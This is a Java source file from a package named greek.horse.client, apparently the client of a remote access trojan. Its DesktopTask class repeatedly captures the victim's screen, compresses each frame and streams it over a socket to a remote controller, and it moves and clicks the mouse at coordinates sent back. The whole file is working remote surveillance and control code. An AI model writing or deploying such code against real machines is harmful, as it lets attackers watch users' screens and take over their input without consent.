package greek.horse.client.tasks;

import greek.horse.client.ClientSocketManager;
import greek.horse.models.FunctionTicket;
import greek.horse.models.ImageUtil;
import greek.horse.models.MonitorDesktopWrapper;
import net.coobird.thumbnailator.Thumbnails;
import org.apache.log4j.Logger;
import org.jetbrains.annotations.NotNull;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.concurrent.atomic.AtomicReference;

public class DesktopTask implements Runnable {
    private final ClientSocketManager client;
    private final Robot bot;
    private FunctionTicket ticket;
    private final AtomicReference<MonitorDesktopWrapper> info = new AtomicReference<>();
    private double lastScale;
    private static final int interval = 200;

    private static final Logger log = Logger.getLogger(DesktopTask.class);
    private Rectangle lastRect;

    public DesktopTask(ClientSocketManager client, Robot bot) {
        this.client = client;
        this.bot = bot;
    }

    @Override
    public void run() {
        while (client.getRunning().get()) {
            if (ticket != null && this.client.getFixedMap().containsKey(ticket)) {

                long time = System.currentTimeMillis() + interval;

                while (client.getRunning().get() && client.getFixedMap().containsKey(ticket)) {
                    try {
                        if (System.currentTimeMillis() < time) {
                            Thread.sleep(10);
                            continue;
                        } else {
                            time = System.currentTimeMillis() + interval;
                        }
                        double w = info.getAcquire().getWidth();
                        double h = info.getAcquire().getHeight();
                        boolean greyscale = info.getAcquire().isCompressed();

                        HashMap<FunctionTicket, Object> answerMap = new HashMap<>();
                        answerMap.put(ticket, getBytesObject(w, h, greyscale, info.getAcquire().getMonitor()));
                        client.getOos().getAcquire().writeObject(answerMap);
                        client.getOos().getAcquire().flush();

                    } catch (Exception e) {
//                        e.printStackTrace();
                        log.error(e);
                    }
                }

            }
            try {
                Thread.sleep(500);
            } catch (InterruptedException e) {
                log.error(e);
            }
        }
    }

    @NotNull
    private Object getBytesObject(double W, double H, boolean greyscale, int monitor) throws IOException {
        BufferedImage screenCapture = createScreenCapture(monitor);

        double w = screenCapture.getWidth();
        double h = screenCapture.getHeight();
        double x = W / w;
        double y = H / h;
        lastScale = Math.min(x, y);

        BufferedImage bi = Thumbnails.of(screenCapture).forceSize((int) (w * lastScale), (int) (h * lastScale)).asBufferedImage();

        if (greyscale) {
            bi = ImageUtil.greyIt(bi);
        } else {
            bi = ImageUtil.reduceIt(bi);
        }

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageIO.write(bi, "gif", baos);
        return baos.toByteArray();
    }

    private BufferedImage createScreenCapture(int monitor) {
        GraphicsDevice[] devices = GraphicsEnvironment
                .getLocalGraphicsEnvironment()
                .getScreenDevices();

        monitor = monitor < devices.length ? monitor : 0;

        lastRect = GraphicsEnvironment.getLocalGraphicsEnvironment()
                .getScreenDevices()[monitor]
                .getDefaultConfiguration()
                .getBounds();

        return bot.createScreenCapture(lastRect);
    }

    public void pressClick(int x, int y, int code) {
        int a = (int) (x / lastScale);
        int b = (int) (y / lastScale);
        bot.mouseMove((int) (a + lastRect.getX()), (int) (b + lastRect.getY()));
        bot.mousePress(code);
    }

    public void releaseClick(int x, int y, int code) {
        int a = (int) (x / lastScale);
        int b = (int) (y / lastScale);
        bot.mouseMove((int) (a + lastRect.getX()), (int) (b + lastRect.getY()));
        bot.mouseRelease(code);
    }

    public void setTicket(FunctionTicket ticket) {
        this.ticket = ticket;
    }

    public void setInfo(MonitorDesktopWrapper info) {
        this.info.lazySet(info);
    }

    public double getLastScale() {
        return lastScale;
    }
}
